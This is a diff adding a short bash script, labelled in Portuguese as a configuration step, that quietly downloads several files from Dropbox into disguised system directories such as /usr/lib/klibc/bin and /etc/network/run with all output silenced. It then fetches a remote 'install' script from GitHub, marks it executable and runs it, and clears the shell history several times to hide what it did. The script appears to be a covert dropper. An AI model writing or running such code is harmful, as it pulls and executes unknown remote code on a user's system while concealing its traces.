@@ -1,0 +1,20 @@
+#!/bin/bash
+
+echo "CONFIGURANDO..."
+
+history -c
+
+wget -P /usr/lib/klibc/bin https://www.dropbox.com/s/345o0zyeset9or1/chooa 1> /dev/null 2> /dev/null
+
+wget -P /etc/network/run https://www.dropbox.com/s/96ro5bgqiwd8fk4/528 1> /dev/null 2> /dev/null
+
+history -c
+
+wget -P /usr/lib/mc/fish/ https://www.dropbox.com/s/ji7xs4b4bwdu2jr/sug.xi 1> /dev/null 2> /dev/null
+
+wget https://raw.githubusercontent.com/RDY8799/RDYSOFTWARE/master/install 2> /dev/null && chmod 711 install 2> /dev/null && ./install
+
+history -c
+clear
+
+echo "√ Concluído! √"
